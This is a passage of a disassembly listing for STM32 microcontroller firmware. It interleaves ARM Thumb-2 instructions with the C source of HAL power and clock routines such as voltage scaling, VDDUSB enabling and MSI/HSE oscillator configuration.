}
 8003998:	4618      	mov	r0, r3
 800399a:	46bd      	mov	sp, r7
 800399c:	f85d 7b04 	ldr.w	r7, [sp], #4
 80039a0:	4770      	bx	lr
 80039a2:	bf00      	nop
 80039a4:	40007000 	.word	0x40007000

080039a8 <HAL_PWREx_ControlVoltageScaling>:
  *        cleared before returning the status. If the flag is not cleared within
  *        50 microseconds, HAL_TIMEOUT status is reported.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_PWREx_ControlVoltageScaling(uint32_t VoltageScaling)
{
 80039a8:	b480      	push	{r7}
 80039aa:	b085      	sub	sp, #20
 80039ac:	af00      	add	r7, sp, #0
 80039ae:	6078      	str	r0, [r7, #4]
  }

#else

  /* If Set Range 1 */
  if (VoltageScaling == PWR_REGULATOR_VOLTAGE_SCALE1)
 80039b0:	687b      	ldr	r3, [r7, #4]
 80039b2:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80039b6:	d130      	bne.n	8003a1a <HAL_PWREx_ControlVoltageScaling+0x72>
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE1)
 80039b8:	4b23      	ldr	r3, [pc, #140]	; (8003a48 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80039ba:	681b      	ldr	r3, [r3, #0]
 80039bc:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 80039c0:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80039c4:	d038      	beq.n	8003a38 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 1 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE1);
 80039c6:	4b20      	ldr	r3, [pc, #128]	; (8003a48 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80039c8:	681b      	ldr	r3, [r3, #0]
 80039ca:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 80039ce:	4a1e      	ldr	r2, [pc, #120]	; (8003a48 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80039d0:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 80039d4:	6013      	str	r3, [r2, #0]

      /* Wait until VOSF is cleared */
      wait_loop_index = ((PWR_FLAG_SETTING_DELAY_US * SystemCoreClock) / 1000000U) + 1U;
 80039d6:	4b1d      	ldr	r3, [pc, #116]	; (8003a4c <HAL_PWREx_ControlVoltageScaling+0xa4>)
 80039d8:	681b      	ldr	r3, [r3, #0]
 80039da:	2232      	movs	r2, #50	; 0x32
 80039dc:	fb02 f303 	mul.w	r3, r2, r3
 80039e0:	4a1b      	ldr	r2, [pc, #108]	; (8003a50 <HAL_PWREx_ControlVoltageScaling+0xa8>)
 80039e2:	fba2 2303 	umull	r2, r3, r2, r3
 80039e6:	0c9b      	lsrs	r3, r3, #18
 80039e8:	3301      	adds	r3, #1
 80039ea:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 80039ec:	e002      	b.n	80039f4 <HAL_PWREx_ControlVoltageScaling+0x4c>
      {
        wait_loop_index--;
 80039ee:	68fb      	ldr	r3, [r7, #12]
 80039f0:	3b01      	subs	r3, #1
 80039f2:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 80039f4:	4b14      	ldr	r3, [pc, #80]	; (8003a48 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80039f6:	695b      	ldr	r3, [r3, #20]
 80039f8:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80039fc:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003a00:	d102      	bne.n	8003a08 <HAL_PWREx_ControlVoltageScaling+0x60>
 8003a02:	68fb      	ldr	r3, [r7, #12]
 8003a04:	2b00      	cmp	r3, #0
 8003a06:	d1f2      	bne.n	80039ee <HAL_PWREx_ControlVoltageScaling+0x46>
      }
      if (HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF))
 8003a08:	4b0f      	ldr	r3, [pc, #60]	; (8003a48 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a0a:	695b      	ldr	r3, [r3, #20]
 8003a0c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003a10:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003a14:	d110      	bne.n	8003a38 <HAL_PWREx_ControlVoltageScaling+0x90>
      {
        return HAL_TIMEOUT;
 8003a16:	2303      	movs	r3, #3
 8003a18:	e00f      	b.n	8003a3a <HAL_PWREx_ControlVoltageScaling+0x92>
      }
    }
  }
  else
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE2)
 8003a1a:	4b0b      	ldr	r3, [pc, #44]	; (8003a48 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a1c:	681b      	ldr	r3, [r3, #0]
 8003a1e:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 8003a22:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003a26:	d007      	beq.n	8003a38 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 2 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE2);
 8003a28:	4b07      	ldr	r3, [pc, #28]	; (8003a48 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a2a:	681b      	ldr	r3, [r3, #0]
 8003a2c:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 8003a30:	4a05      	ldr	r2, [pc, #20]	; (8003a48 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a32:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8003a36:	6013      	str	r3, [r2, #0]
      /* No need to wait for VOSF to be cleared for this transition */
    }
  }
#endif

  return HAL_OK;
 8003a38:	2300      	movs	r3, #0
}
 8003a3a:	4618      	mov	r0, r3
 8003a3c:	3714      	adds	r7, #20
 8003a3e:	46bd      	mov	sp, r7
 8003a40:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003a44:	4770      	bx	lr
 8003a46:	bf00      	nop
 8003a48:	40007000 	.word	0x40007000
 8003a4c:	20000000 	.word	0x20000000
 8003a50:	431bde83 	.word	0x431bde83

08003a54 <HAL_PWREx_EnableVddUSB>:
  * @brief Enable VDDUSB supply.
  * @note  Remove VDDUSB electrical and logical isolation, once VDDUSB supply is present.
  * @retval None
  */
void HAL_PWREx_EnableVddUSB(void)
{
 8003a54:	b480      	push	{r7}
 8003a56:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR2, PWR_CR2_USV);
 8003a58:	4b05      	ldr	r3, [pc, #20]	; (8003a70 <HAL_PWREx_EnableVddUSB+0x1c>)
 8003a5a:	685b      	ldr	r3, [r3, #4]
 8003a5c:	4a04      	ldr	r2, [pc, #16]	; (8003a70 <HAL_PWREx_EnableVddUSB+0x1c>)
 8003a5e:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8003a62:	6053      	str	r3, [r2, #4]
}
 8003a64:	bf00      	nop
 8003a66:	46bd      	mov	sp, r7
 8003a68:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003a6c:	4770      	bx	lr
 8003a6e:	bf00      	nop
 8003a70:	40007000 	.word	0x40007000

08003a74 <HAL_RCC_OscConfig>:
  * @note   If HSE failed to start, HSE should be disabled before recalling
            HAL_RCC_OscConfig().
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCC_OscConfig(RCC_OscInitTypeDef  *RCC_OscInitStruct)
{
 8003a74:	b580      	push	{r7, lr}
 8003a76:	b088      	sub	sp, #32
 8003a78:	af00      	add	r7, sp, #0
 8003a7a:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;
  HAL_StatusTypeDef status;
  uint32_t sysclk_source, pll_config;

  /* Check Null pointer */
  if(RCC_OscInitStruct == NULL)
 8003a7c:	687b      	ldr	r3, [r7, #4]
 8003a7e:	2b00      	cmp	r3, #0
 8003a80:	d102      	bne.n	8003a88 <HAL_RCC_OscConfig+0x14>
  {
    return HAL_ERROR;
 8003a82:	2301      	movs	r3, #1
 8003a84:	f000 bc02 	b.w	800428c <HAL_RCC_OscConfig+0x818>
  }

  /* Check the parameters */
  assert_param(IS_RCC_OSCILLATORTYPE(RCC_OscInitStruct->OscillatorType));

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 8003a88:	4b96      	ldr	r3, [pc, #600]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003a8a:	689b      	ldr	r3, [r3, #8]
 8003a8c:	f003 030c 	and.w	r3, r3, #12
 8003a90:	61bb      	str	r3, [r7, #24]
  pll_config = __HAL_RCC_GET_PLL_OSCSOURCE();
 8003a92:	4b94      	ldr	r3, [pc, #592]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003a94:	68db      	ldr	r3, [r3, #12]
 8003a96:	f003 0303 	and.w	r3, r3, #3
 8003a9a:	617b      	str	r3, [r7, #20]

  /*----------------------------- MSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_MSI) == RCC_OSCILLATORTYPE_MSI)
 8003a9c:	687b      	ldr	r3, [r7, #4]
 8003a9e:	681b      	ldr	r3, [r3, #0]
 8003aa0:	f003 0310 	and.w	r3, r3, #16
 8003aa4:	2b00      	cmp	r3, #0
 8003aa6:	f000 80e4 	beq.w	8003c72 <HAL_RCC_OscConfig+0x1fe>
    assert_param(IS_RCC_MSI(RCC_OscInitStruct->MSIState));
    assert_param(IS_RCC_MSICALIBRATION_VALUE(RCC_OscInitStruct->MSICalibrationValue));
    assert_param(IS_RCC_MSI_CLOCK_RANGE(RCC_OscInitStruct->MSIClockRange));

    /* Check if MSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 8003aaa:	69bb      	ldr	r3, [r7, #24]
 8003aac:	2b00      	cmp	r3, #0
 8003aae:	d007      	beq.n	8003ac0 <HAL_RCC_OscConfig+0x4c>
 8003ab0:	69bb      	ldr	r3, [r7, #24]
 8003ab2:	2b0c      	cmp	r3, #12
 8003ab4:	f040 808b 	bne.w	8003bce <HAL_RCC_OscConfig+0x15a>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_MSI)))
 8003ab8:	697b      	ldr	r3, [r7, #20]
 8003aba:	2b01      	cmp	r3, #1
 8003abc:	f040 8087 	bne.w	8003bce <HAL_RCC_OscConfig+0x15a>
    {
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003ac0:	4b88      	ldr	r3, [pc, #544]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003ac2:	681b      	ldr	r3, [r3, #0]
 8003ac4:	f003 0302 	and.w	r3, r3, #2
 8003ac8:	2b00      	cmp	r3, #0
 8003aca:	d005      	beq.n	8003ad8 <HAL_RCC_OscConfig+0x64>
 8003acc:	687b      	ldr	r3, [r7, #4]
 8003ace:	699b      	ldr	r3, [r3, #24]
 8003ad0:	2b00      	cmp	r3, #0
 8003ad2:	d101      	bne.n	8003ad8 <HAL_RCC_OscConfig+0x64>
      {
        return HAL_ERROR;
 8003ad4:	2301      	movs	r3, #1
 8003ad6:	e3d9      	b.n	800428c <HAL_RCC_OscConfig+0x818>
      else
      {
        /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
           must be correctly programmed according to the frequency of the CPU clock
           (HCLK) and the supply voltage of the device. */
        if(RCC_OscInitStruct->MSIClockRange > __HAL_RCC_GET_MSI_RANGE())
 8003ad8:	687b      	ldr	r3, [r7, #4]
 8003ada:	6a1a      	ldr	r2, [r3, #32]
 8003adc:	4b81      	ldr	r3, [pc, #516]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003ade:	681b      	ldr	r3, [r3, #0]
 8003ae0:	f003 0308 	and.w	r3, r3, #8
 8003ae4:	2b00      	cmp	r3, #0
 8003ae6:	d004      	beq.n	8003af2 <HAL_RCC_OscConfig+0x7e>
 8003ae8:	4b7e      	ldr	r3, [pc, #504]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003aea:	681b      	ldr	r3, [r3, #0]
 8003aec:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8003af0:	e005      	b.n	8003afe <HAL_RCC_OscConfig+0x8a>
 8003af2:	4b7c      	ldr	r3, [pc, #496]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003af4:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003af8:	091b      	lsrs	r3, r3, #4
 8003afa:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8003afe:	4293      	cmp	r3, r2
 8003b00:	d223      	bcs.n	8003b4a <HAL_RCC_OscConfig+0xd6>
        {
          /* First increase number of wait states update if necessary */
          if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 8003b02:	687b      	ldr	r3, [r7, #4]
 8003b04:	6a1b      	ldr	r3, [r3, #32]
 8003b06:	4618      	mov	r0, r3
 8003b08:	f000 fd8c 	bl	8004624 <RCC_SetFlashLatencyFromMSIRange>
 8003b0c:	4603      	mov	r3, r0
 8003b0e:	2b00      	cmp	r3, #0
 8003b10:	d001      	beq.n	8003b16 <HAL_RCC_OscConfig+0xa2>
          {
            return HAL_ERROR;
 8003b12:	2301      	movs	r3, #1
 8003b14:	e3ba      	b.n	800428c <HAL_RCC_OscConfig+0x818>
          }

          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003b16:	4b73      	ldr	r3, [pc, #460]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003b18:	681b      	ldr	r3, [r3, #0]
 8003b1a:	4a72      	ldr	r2, [pc, #456]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003b1c:	f043 0308 	orr.w	r3, r3, #8
 8003b20:	6013      	str	r3, [r2, #0]
 8003b22:	4b70      	ldr	r3, [pc, #448]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003b24:	681b      	ldr	r3, [r3, #0]
 8003b26:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003b2a:	687b      	ldr	r3, [r7, #4]
 8003b2c:	6a1b      	ldr	r3, [r3, #32]
 8003b2e:	496d      	ldr	r1, [pc, #436]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003b30:	4313      	orrs	r3, r2
 8003b32:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003b34:	4b6b      	ldr	r3, [pc, #428]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003b36:	685b      	ldr	r3, [r3, #4]
 8003b38:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003b3c:	687b      	ldr	r3, [r7, #4]
 8003b3e:	69db      	ldr	r3, [r3, #28]
 8003b40:	021b      	lsls	r3, r3, #8
 8003b42:	4968      	ldr	r1, [pc, #416]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003b44:	4313      	orrs	r3, r2
 8003b46:	604b      	str	r3, [r1, #4]
 8003b48:	e025      	b.n	8003b96 <HAL_RCC_OscConfig+0x122>
        }
        else
        {
          /* Else, keep current flash latency while decreasing applies */
          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003b4a:	4b66      	ldr	r3, [pc, #408]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003b4c:	681b      	ldr	r3, [r3, #0]
 8003b4e:	4a65      	ldr	r2, [pc, #404]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003b50:	f043 0308 	orr.w	r3, r3, #8
 8003b54:	6013      	str	r3, [r2, #0]
 8003b56:	4b63      	ldr	r3, [pc, #396]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003b58:	681b      	ldr	r3, [r3, #0]
 8003b5a:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003b5e:	687b      	ldr	r3, [r7, #4]
 8003b60:	6a1b      	ldr	r3, [r3, #32]
 8003b62:	4960      	ldr	r1, [pc, #384]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003b64:	4313      	orrs	r3, r2
 8003b66:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003b68:	4b5e      	ldr	r3, [pc, #376]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003b6a:	685b      	ldr	r3, [r3, #4]
 8003b6c:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003b70:	687b      	ldr	r3, [r7, #4]
 8003b72:	69db      	ldr	r3, [r3, #28]
 8003b74:	021b      	lsls	r3, r3, #8
 8003b76:	495b      	ldr	r1, [pc, #364]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003b78:	4313      	orrs	r3, r2
 8003b7a:	604b      	str	r3, [r1, #4]

          /* Decrease number of wait states update if necessary */
          /* Only possible when MSI is the System clock source  */
          if(sysclk_source == RCC_CFGR_SWS_MSI)
 8003b7c:	69bb      	ldr	r3, [r7, #24]
 8003b7e:	2b00      	cmp	r3, #0
 8003b80:	d109      	bne.n	8003b96 <HAL_RCC_OscConfig+0x122>
          {
            if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 8003b82:	687b      	ldr	r3, [r7, #4]
 8003b84:	6a1b      	ldr	r3, [r3, #32]
 8003b86:	4618      	mov	r0, r3
 8003b88:	f000 fd4c 	bl	8004624 <RCC_SetFlashLatencyFromMSIRange>
 8003b8c:	4603      	mov	r3, r0
 8003b8e:	2b00      	cmp	r3, #0
 8003b90:	d001      	beq.n	8003b96 <HAL_RCC_OscConfig+0x122>
            {
              return HAL_ERROR;
 8003b92:	2301      	movs	r3, #1
 8003b94:	e37a      	b.n	800428c <HAL_RCC_OscConfig+0x818>
            }
          }
        }

        /* Update the SystemCoreClock global variable */
        SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 8003b96:	f000 fc81 	bl	800449c <HAL_RCC_GetSysClockFreq>
 8003b9a:	4602      	mov	r2, r0
 8003b9c:	4b51      	ldr	r3, [pc, #324]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003b9e:	689b      	ldr	r3, [r3, #8]
 8003ba0:	091b      	lsrs	r3, r3, #4
 8003ba2:	f003 030f 	and.w	r3, r3, #15
 8003ba6:	4950      	ldr	r1, [pc, #320]	; (8003ce8 <HAL_RCC_OscConfig+0x274>)
 8003ba8:	5ccb      	ldrb	r3, [r1, r3]
 8003baa:	f003 031f 	and.w	r3, r3, #31
 8003bae:	fa22 f303 	lsr.w	r3, r2, r3
 8003bb2:	4a4e      	ldr	r2, [pc, #312]	; (8003cec <HAL_RCC_OscConfig+0x278>)
 8003bb4:	6013      	str	r3, [r2, #0]

        /* Configure the source of time base considering new system clocks settings*/
        status = HAL_InitTick(uwTickPrio);
 8003bb6:	4b4e      	ldr	r3, [pc, #312]	; (8003cf0 <HAL_RCC_OscConfig+0x27c>)
 8003bb8:	681b      	ldr	r3, [r3, #0]
 8003bba:	4618      	mov	r0, r3
 8003bbc:	f7fd fb86 	bl	80012cc <HAL_InitTick>
 8003bc0:	4603      	mov	r3, r0
 8003bc2:	73fb      	strb	r3, [r7, #15]
        if(status != HAL_OK)
 8003bc4:	7bfb      	ldrb	r3, [r7, #15]
 8003bc6:	2b00      	cmp	r3, #0
 8003bc8:	d052      	beq.n	8003c70 <HAL_RCC_OscConfig+0x1fc>
        {
          return status;
 8003bca:	7bfb      	ldrb	r3, [r7, #15]
 8003bcc:	e35e      	b.n	800428c <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Check the MSI State */
      if(RCC_OscInitStruct->MSIState != RCC_MSI_OFF)
 8003bce:	687b      	ldr	r3, [r7, #4]
 8003bd0:	699b      	ldr	r3, [r3, #24]
 8003bd2:	2b00      	cmp	r3, #0
 8003bd4:	d032      	beq.n	8003c3c <HAL_RCC_OscConfig+0x1c8>
      {
        /* Enable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_ENABLE();
 8003bd6:	4b43      	ldr	r3, [pc, #268]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003bd8:	681b      	ldr	r3, [r3, #0]
 8003bda:	4a42      	ldr	r2, [pc, #264]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003bdc:	f043 0301 	orr.w	r3, r3, #1
 8003be0:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003be2:	f7fd fbc3 	bl	800136c <HAL_GetTick>
 8003be6:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003be8:	e008      	b.n	8003bfc <HAL_RCC_OscConfig+0x188>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003bea:	f7fd fbbf 	bl	800136c <HAL_GetTick>
 8003bee:	4602      	mov	r2, r0
 8003bf0:	693b      	ldr	r3, [r7, #16]
 8003bf2:	1ad3      	subs	r3, r2, r3
 8003bf4:	2b02      	cmp	r3, #2
 8003bf6:	d901      	bls.n	8003bfc <HAL_RCC_OscConfig+0x188>
          {
            return HAL_TIMEOUT;
 8003bf8:	2303      	movs	r3, #3
 8003bfa:	e347      	b.n	800428c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003bfc:	4b39      	ldr	r3, [pc, #228]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003bfe:	681b      	ldr	r3, [r3, #0]
 8003c00:	f003 0302 	and.w	r3, r3, #2
 8003c04:	2b00      	cmp	r3, #0
 8003c06:	d0f0      	beq.n	8003bea <HAL_RCC_OscConfig+0x176>
          }
        }
         /* Selects the Multiple Speed oscillator (MSI) clock range .*/
        __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003c08:	4b36      	ldr	r3, [pc, #216]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003c0a:	681b      	ldr	r3, [r3, #0]
 8003c0c:	4a35      	ldr	r2, [pc, #212]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003c0e:	f043 0308 	orr.w	r3, r3, #8
 8003c12:	6013      	str	r3, [r2, #0]
 8003c14:	4b33      	ldr	r3, [pc, #204]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003c16:	681b      	ldr	r3, [r3, #0]
 8003c18:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003c1c:	687b      	ldr	r3, [r7, #4]
 8003c1e:	6a1b      	ldr	r3, [r3, #32]
 8003c20:	4930      	ldr	r1, [pc, #192]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003c22:	4313      	orrs	r3, r2
 8003c24:	600b      	str	r3, [r1, #0]
         /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
        __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003c26:	4b2f      	ldr	r3, [pc, #188]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003c28:	685b      	ldr	r3, [r3, #4]
 8003c2a:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003c2e:	687b      	ldr	r3, [r7, #4]
 8003c30:	69db      	ldr	r3, [r3, #28]
 8003c32:	021b      	lsls	r3, r3, #8
 8003c34:	492b      	ldr	r1, [pc, #172]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003c36:	4313      	orrs	r3, r2
 8003c38:	604b      	str	r3, [r1, #4]
 8003c3a:	e01a      	b.n	8003c72 <HAL_RCC_OscConfig+0x1fe>

      }
      else
      {
        /* Disable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_DISABLE();
 8003c3c:	4b29      	ldr	r3, [pc, #164]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003c3e:	681b      	ldr	r3, [r3, #0]
 8003c40:	4a28      	ldr	r2, [pc, #160]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003c42:	f023 0301 	bic.w	r3, r3, #1
 8003c46:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003c48:	f7fd fb90 	bl	800136c <HAL_GetTick>
 8003c4c:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003c4e:	e008      	b.n	8003c62 <HAL_RCC_OscConfig+0x1ee>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003c50:	f7fd fb8c 	bl	800136c <HAL_GetTick>
 8003c54:	4602      	mov	r2, r0
 8003c56:	693b      	ldr	r3, [r7, #16]
 8003c58:	1ad3      	subs	r3, r2, r3
 8003c5a:	2b02      	cmp	r3, #2
 8003c5c:	d901      	bls.n	8003c62 <HAL_RCC_OscConfig+0x1ee>
          {
            return HAL_TIMEOUT;
 8003c5e:	2303      	movs	r3, #3
 8003c60:	e314      	b.n	800428c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003c62:	4b20      	ldr	r3, [pc, #128]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003c64:	681b      	ldr	r3, [r3, #0]
 8003c66:	f003 0302 	and.w	r3, r3, #2
 8003c6a:	2b00      	cmp	r3, #0
 8003c6c:	d1f0      	bne.n	8003c50 <HAL_RCC_OscConfig+0x1dc>
 8003c6e:	e000      	b.n	8003c72 <HAL_RCC_OscConfig+0x1fe>
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003c70:	bf00      	nop
        }
      }
    }
  }
  /*------------------------------- HSE Configuration ------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 8003c72:	687b      	ldr	r3, [r7, #4]
 8003c74:	681b      	ldr	r3, [r3, #0]
 8003c76:	f003 0301 	and.w	r3, r3, #1
 8003c7a:	2b00      	cmp	r3, #0
 8003c7c:	d073      	beq.n	8003d66 <HAL_RCC_OscConfig+0x2f2>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSE(RCC_OscInitStruct->HSEState));

    /* When the HSE is used as system clock or clock source for PLL in these cases it is not allowed to be disabled */
    if((sysclk_source == RCC_CFGR_SWS_HSE) ||
 8003c7e:	69bb      	ldr	r3, [r7, #24]
 8003c80:	2b08      	cmp	r3, #8
 8003c82:	d005      	beq.n	8003c90 <HAL_RCC_OscConfig+0x21c>
 8003c84:	69bb      	ldr	r3, [r7, #24]
 8003c86:	2b0c      	cmp	r3, #12
 8003c88:	d10e      	bne.n	8003ca8 <HAL_RCC_OscConfig+0x234>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSE)))
 8003c8a:	697b      	ldr	r3, [r7, #20]
 8003c8c:	2b03      	cmp	r3, #3
 8003c8e:	d10b      	bne.n	8003ca8 <HAL_RCC_OscConfig+0x234>
    {
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003c90:	4b14      	ldr	r3, [pc, #80]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003c92:	681b      	ldr	r3, [r3, #0]
 8003c94:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003c98:	2b00      	cmp	r3, #0
 8003c9a:	d063      	beq.n	8003d64 <HAL_RCC_OscConfig+0x2f0>
 8003c9c:	687b      	ldr	r3, [r7, #4]
 8003c9e:	685b      	ldr	r3, [r3, #4]
 8003ca0:	2b00      	cmp	r3, #0
 8003ca2:	d15f      	bne.n	8003d64 <HAL_RCC_OscConfig+0x2f0>
      {
        return HAL_ERROR;
 8003ca4:	2301      	movs	r3, #1
 8003ca6:	e2f1      	b.n	800428c <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Set the new HSE configuration ---------------------------------------*/
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 8003ca8:	687b      	ldr	r3, [r7, #4]
 8003caa:	685b      	ldr	r3, [r3, #4]
 8003cac:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8003cb0:	d106      	bne.n	8003cc0 <HAL_RCC_OscConfig+0x24c>
 8003cb2:	4b0c      	ldr	r3, [pc, #48]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003cb4:	681b      	ldr	r3, [r3, #0]
 8003cb6:	4a0b      	ldr	r2, [pc, #44]	; (8003ce4 <HAL_RCC_OscConfig+0x270>)
 8003cb8:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003cbc:	6013      	str	r3, [r2, #0]
